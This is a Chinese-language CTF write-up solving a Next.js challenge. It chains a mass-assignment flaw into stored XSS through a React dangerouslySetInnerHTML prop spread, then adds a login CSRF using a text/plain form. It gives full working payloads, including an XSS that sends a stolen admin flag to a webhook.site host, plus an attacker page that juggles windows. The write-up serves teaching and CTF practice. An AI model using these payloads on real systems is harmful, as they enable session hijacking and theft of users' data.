# React2XSS Writeup

## 题目信息

题目是一个 Next.js 应用，给了源码和一个在线实例。  
Flag 格式：

```text
PUCTF26{[a-zA-Z0-9_]+_[a-fA-F0-9]{32}}
```

目标是想办法让 bot 以 admin 身份访问我们的 payload，并最终把 admin 的 flag 打出来。

---

## 一、先看 flag 在哪里

先看数据库初始化逻辑 `lib/db.ts`：

```ts
db.prepare('INSERT INTO users (username, password, is_admin, bio, data) VALUES (?, ?, ?, ?, ?)').run(
  ADMIN_USERNAME,
  ADMIN_PASSWORD,
  1,
  FLAG,
  '{"website": "http://example.com", "location": "NuttyShell"}'
);
```

可以看到：

- admin 用户名固定是 `admin`
- **flag 直接被放在 admin 的 `bio` 里**

也就是说，只要能在 **admin 登录态** 下读到它的个人资料，就能拿到 flag。

---

## 二、先找注入点：用户资料是怎么存、怎么渲染的

### 1. 资料更新接口存在“任意字段写入”

看 `app/api/profile/update/route.ts`：

```ts
const { bio, ...dynamicFields } = await request.json();

let userData: Record<string, any> = {};
try {
  userData = JSON.parse(user.data || '{}');
} catch (e) {
  userData = {};
}

const updatedData = {
  ...userData,
  ...dynamicFields
};
```

重点在这里：

- 后端从请求体里取出 `bio`
- 其余字段全部塞进 `dynamicFields`
- 再直接 merge 进 `user.data`

也就是说，**除了 `bio` 以外，我们可以把任意 JSON 字段写进自己的 `user.data`**。

---

### 2. 首页会把 `user.data` 里的 `viewProgressStyle` 直接 spread 到 DOM 节点

看首页 `app/page.tsx`：

```tsx
<progress max={100} value={viewCount} {...userData.viewProgressStyle} />
```

这行是整题核心。

React 这里把 `userData.viewProgressStyle` 直接展开到原生 DOM 节点 `<progress>` 上。  
如果我们能控制这个对象，就不只是能改 `style`，还可能塞进别的危险 prop。

例如：

```json
{
  "viewProgressStyle": {
    "dangerouslySetInnerHTML": {
      "__html": "<svg onload=alert(1)>"
    }
  }
}
```

如果这个对象真的被 spread 上去，就能把 `<progress>` 变成一个带 HTML 注入的节点，最后触发 **stored XSS**。

---

## 三、为什么前端表单看起来“只能改 style”，但其实还能打进去

设置页 `app/account/settings/page.tsx` 的逻辑是：

```ts
const parsedStyle = JSON.parse(viewProgressStyleJson);
viewProgressStyle = { style: parsedStyle };

body: JSON.stringify({ bio, website, location, viewProgressStyle })
```

正常用户通过表单只能提交：

```json
{
  "viewProgressStyle": {
    "style": { ... }
  }
}
```

也就是它本来是想让我们只改 CSS。

但是后端并没有强校验 `viewProgressStyle` 的结构，  
所以只要我们在浏览器里 **拦截提交请求并改 body**，就能把：

```json
{
  "viewProgressStyle": {
    "dangerouslySetInnerHTML": {
      "__html": "<svg onload=...>"
    }
  }
}
```

塞进去。

这就绕过了前端限制。

---

## 四、先本地确认 stored XSS 成立

在自己的 `/account/settings` 页面打开 DevTools Console，先挂一个 `fetch` 拦截器：

```js
const PAYLOAD = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>`;

const origFetch = window.fetch;
window.fetch = async (url, opts = {}) => {
  if (typeof url === 'string' && url.includes('/api/profile/update')) {
    const body = JSON.parse(opts.body);
    body.viewProgressStyle = {
      dangerouslySetInnerHTML: {
        __html: PAYLOAD
      }
    };
    opts.body = JSON.stringify(body);
    window.fetch = origFetch;
  }
  return origFetch(url, opts);
};

alert('現在正常點一次 Update Profile');
```

然后：

1. 随便改一点 bio
2. 点一次 **Update Profile**
3. 回首页 `/`

如果这里成功弹框，就说明：

- `viewProgressStyle` 的对象注入成立
- `dangerouslySetInnerHTML` 可以被打进去
- **stored XSS 确认存在**

---

## 五、bot 在干什么

看 `lib/bot.ts`：

```ts
await page.goto(`${BOT_CONFIG.APPURL}/login`, { waitUntil: 'load' });

await page.fill('input[id="username"]', ADMIN_USERNAME);
await page.fill('input[id="password"]', adminUser.password);
await page.click('button[type="submit"]');
await sleep(BOT_CONFIG.WAIT_AFTER_LOGIN);

await page.goto(urlToVisit, { waitUntil: 'load' });
await sleep(BOT_CONFIG.WAIT_AFTER_VISIT);
```

再看 `lib/config.ts`：

```ts
APPURL: process.env.APPURL || 'http://localhost:3000',
WAIT_AFTER_LOGIN: 1000,
WAIT_AFTER_VISIT: 5000,
```

bot 的行为很明确：

1. **先在 `http://localhost:3000` 登录 admin**
2. 然后访问我们 report 的 URL
3. 停留 5 秒后关闭

这意味着两件事：

### 第一，bot 的真实登录域名是 `http://localhost:3000`

不是公网的 `chal.polyuctf.com:xxxx`。

### 第二，如果我们让 bot 直接访问 `http://localhost:3000/`

它看到的是 **admin 自己的主页**，不是我们用户的主页。

所以题目的难点不是“有没有 XSS”，而是：

> **怎么在 admin 已经登录 localhost 的前提下，让 bot 再加载我们那份带 XSS 的用户资料。**

---

## 六、为什么不能只靠“让 bot 打开 `/`”

首页 `app/page.tsx` 会拿当前 session：

```ts
const currentUser = await getCurrentUser();
const user = userDb.findById(currentUser.userId);
```

它显示的是 **当前 session 对应用户** 的资料。

所以：

- admin 打开 `/`，看到的是 admin 主页
- 我们用户打进去的 XSS 只存在 **我们自己的资料页**
- bot 默认不会主动切成我们的账号

因此利用链必须分成两个窗口：

1. 一个窗口保留 **admin 的页面内容**
2. 另一个窗口切成 **我们的账号**
3. 由“我们的主页上的 stored XSS”去读“admin 窗口里的 DOM”

---

## 七、额外观察：`/api/profile` 比 `/` 更适合藏 admin 内容

看 `app/api/profile/route.ts`：

```ts
return NextResponse.json({
  id: user.id,
  username: user.username,
  bio: user.bio,
  ...userData,
});
```

只要当前登录的是 admin，访问 `/api/profile` 就会直接返回 JSON：

```json
{
  "id": 1,
  "username": "admin",
  "bio": "PUCTF26{...}"
}
```

比起读取复杂的 HTML 页面，  
**把 `flagwin` 指向 `/api/profile` 更稳**，因为 `document.body.innerText` 基本就是一整段 JSON，正则一抓就行。

---

## 八、完整利用链

最终思路如下：

### 第一步：注册一个普通用户

比如：

```text
username: aaaabbbb
password: aaaabbbbcc
```

密码长度要至少 10，因为题目有限制。

---

### 第二步：把 stored XSS 写进自己的资料

这里用前面提到的 fetch 拦截，把 payload 写进：

```json
viewProgressStyle.dangerouslySetInnerHTML.__html
```

最终 payload 可以写成：

```js
const HOOK = 'https://webhook.site/你的UUID';

const PAYLOAD = `<svg xmlns="http://www.w3.org/2000/svg" onload="
(()=>{ 
  const send = (m) => (new Image()).src='${HOOK}?x=' + encodeURIComponent(m) + '&t=' + Date.now();
  try {
    const w = window.open('', 'flagwin');
    const txt = (w && w.document && w.document.body) ? w.document.body.innerText : 'NO_BODY';
    const m = txt.match(/PUCTF26\\{[A-Za-z0-9_]+_[A-Fa-f0-9]{32}\\}/);
    send(m ? m[0] : txt.slice(0,500));
  } catch (e) {
    send('ERR=' + String(e));
  }
})()
"></svg>`;
```

它做的事很简单：

- 通过 `window.open('', 'flagwin')` 拿到命名窗口
- 读取那个窗口的 `document.body.innerText`
- 正则提取 flag
- 发到 webhook

---

### 第三步：准备一个外部攻击页

这个攻击页必须做两件事：

#### 1. 先打开一个叫 `flagwin` 的窗口，指向：

```text
http://localhost:3000/api/profile
```

因为此时 bot 还是 admin 登录态，所以这里装进去的是：

```json
{"id":1,"username":"admin","bio":"PUCTF26{...}"}
```

#### 2. 再想办法把另一个 localhost 窗口切成我们的账号，然后打开 `/`

因为我们的 stored XSS 只有“我们自己的主页”才会触发。

---

## 九、最合理的切账号方式：登录 CSRF

`/api/auth/login` 的代码是：

```ts
const { username, password } = await request.json();
await createSession(user.id, user.username);
```

它没有 CSRF 防护。  
所以理论上只要能让 bot 的浏览器给 `http://localhost:3000/api/auth/login` 发一个合法 JSON POST，请求就会把 localhost 上的 session 改成我们的账号。

### 为什么直接 `fetch()` 不稳

在实际浏览器里，从外站去 `fetch('http://localhost:3000/...')` 容易撞到浏览器对跨站 / localhost 的网络限制。  
所以更稳的思路是：

- 用一个 **HTTP** 攻击页
- 用 **HTML form** 做跨站提交
- `target` 指到一个名叫 `workwin` 的窗口

---

## 十、攻击页示意

下面是这条链的核心攻击页逻辑：

```html
<!doctype html>
<meta charset="utf-8">
<title>react2xss</title>
<script>
const LOCAL = 'http://localhost:3000';
const USER = 'aaaabbbb';
const PASS = 'aaaabbbbcc';

window.onload = () => {
  // 1) 保留 admin 的 profile JSON
  const flagwin = window.open(LOCAL + '/api/profile', 'flagwin');

  // 2) 开一个工作窗口
  const workwin = window.open(LOCAL + '/login', 'workwin');

  // 3) 用 text/plain form 伪造 JSON 登录请求
  setTimeout(() => {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = LOCAL + '/api/auth/login';
    form.enctype = 'text/plain';
    form.target = 'workwin';

    const inp = document.createElement('input');
    inp.type = 'hidden';

    // 目标是拼出一个合法 JSON body
    inp.name = `{"username":"${USER}","password":"${PASS}","x":"`;
    inp.value = '"}';

    form.appendChild(inp);
    document.body.appendChild(form);
    form.submit();
  }, 150);

  // 4) 多次尝试把 workwin 导回 /
  setTimeout(() => { workwin.location = LOCAL + '/'; }, 800);
  setTimeout(() => { workwin.location = LOCAL + '/'; }, 1500);
  setTimeout(() => { workwin.location = LOCAL + '/'; }, 2500);
  setTimeout(() => { workwin.location = LOCAL + '/'; }, 3500);
};
</script>
```

---

## 十一、为什么这条链能拿到 flag

完整时序如下：

### 1. bot 登录 admin

此时 `http://localhost:3000` 的 session 是 admin。

### 2. bot 打开我们的攻击页

攻击页先打开：

```text
http://localhost:3000/api/profile
```

到 `flagwin`。

因为还是 admin 登录态，所以 `flagwin` 里是 admin 的 profile JSON，body 里直接带着 flag。

### 3. 攻击页再把另一个 localhost 窗口切成我们的账号

通过登录 CSRF，让 `workwin` 拿到我们的 session。

### 4. 攻击页把 `workwin` 导航到 `/`

这时 `workwin` 会显示 **我们的主页**，而不是 admin 主页。

### 5. 我们的主页里有 stored XSS

因为我们之前把 payload 存进了：

```json
viewProgressStyle.dangerouslySetInnerHTML.__html
```

所以一打开 `/`，XSS 就会执行。

### 6. XSS 读取 `flagwin`

由于两个窗口最后都在 `http://localhost:3000` 同源下，XSS 可以做：

```js
const w = window.open('', 'flagwin');
const txt = w.document.body.innerText;
```

而 `txt` 里已经是 admin 的 profile JSON，自然能正则抓出：

```text
PUCTF26{...}
```

---

## 十二、几个坑点

### 1. 攻击页最好用 HTTP，不要 HTTPS

这题 bot 的内部应用地址是：

```text
http://localhost:3000
```

如果攻击页放在 HTTPS 上，浏览器对“HTTPS 页面去碰 HTTP localhost”的行为更容易出现限制。

---

### 2. bot 只给 5 秒

源码里：

```ts
WAIT_AFTER_VISIT: 5000
```

所以整个利用链必须抢时间。  
这也是为什么攻击页里会反复多次把 `workwin` 导向 `/`。

---

### 3. 非 admin 用户会被定时清理

`lib/db.ts`：

```ts
setInterval(cleanupDatabase, DATABASE_CLEANUP_INTERVAL_MINUTE);
```

而清理逻辑是：

```ts
DELETE FROM users WHERE is_admin = 0
```

所以最好是：

- 现注册
- 现注入
- 现 report

否则你的用户可能已经被清掉了。

---

## 十三、漏洞总结

这题本质上是一个非常典型的“**前端看起来只允许样式，后端却把任意对象 merge 进去**”导致的 stored XSS。

核心漏洞链：

1. `/api/profile/update` 允许把任意字段写进 `user.data`
2. 首页把 `userData.viewProgressStyle` 直接 spread 到 `<progress>`
3. 可注入 `dangerouslySetInnerHTML`
4. 形成 stored XSS
5. 结合 bot 的“先登录 admin，再访问外部 URL”
6. 用双窗口把“admin 的 DOM”和“我们的 XSS”拼起来
7. 读取 admin profile 里的 flag

---

## 十四、结语

这题最有意思的地方不在 XSS 本身，而在 **“XSS 已经有了，但 bot 默认只会给你 admin 自己的页面，怎么把它切到你的页面上去”**。

所以真正的难点其实是：

- 理解 bot 的登录域名是 `localhost`
- 保留 admin 内容的窗口
- 再让另一个窗口触发自己的 stored XSS
- 最后由 XSS 反向读取前一个窗口

一句话概括就是：

> **任意 JSON 写入 + React prop spread 到 DOM + stored XSS + 双窗口 session juggling = flag**

如果只看源码，预期解法基本就是这一条。
